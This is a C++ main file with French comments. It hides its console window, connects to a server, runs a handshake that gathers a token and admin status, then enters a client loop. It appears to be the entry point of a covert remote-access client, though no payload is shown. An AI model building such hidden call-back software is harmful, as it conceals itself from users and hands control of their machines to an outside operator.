#include "../inc/Connexion.h"
#include "../inc/HandShake.h"

int main()
{   
    // Masque la console
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Change le codepage de la console pour UTF-8
    SetConsoleOutputCP(CP_UTF8); 
    _setmode(_fileno(stdout), 0x00020000);  
    _setmode(_fileno(stdin), 0x00020000);

    // Crée une instance de Connexion et de HandShake
    Connexion Client;  
    HandShake Handshake;

    // Établit une connexion avec le serveur
    Client.openConnexion();

    // Configure HandShake avec le socket et exécute les actions préliminaires
    Handshake.setSock(Client.getSocket());
    Handshake.beforeHandShake();

    // Lance le processus de HandShake
    Handshake.startHandShake(); 

    // Configure Client avec les informations collectées par HandShake et lance la boucle principale
    Client.setToken(Handshake.getToken());
    Client.setIsAdmin(Handshake.getIsAdmin());
    Client.setPathProg(Handshake.getPathProg());
    Client.main();

    // Ferme la connexion
    Client.closeConnexion();
    
    // Sortie de programme
    return 0;
}
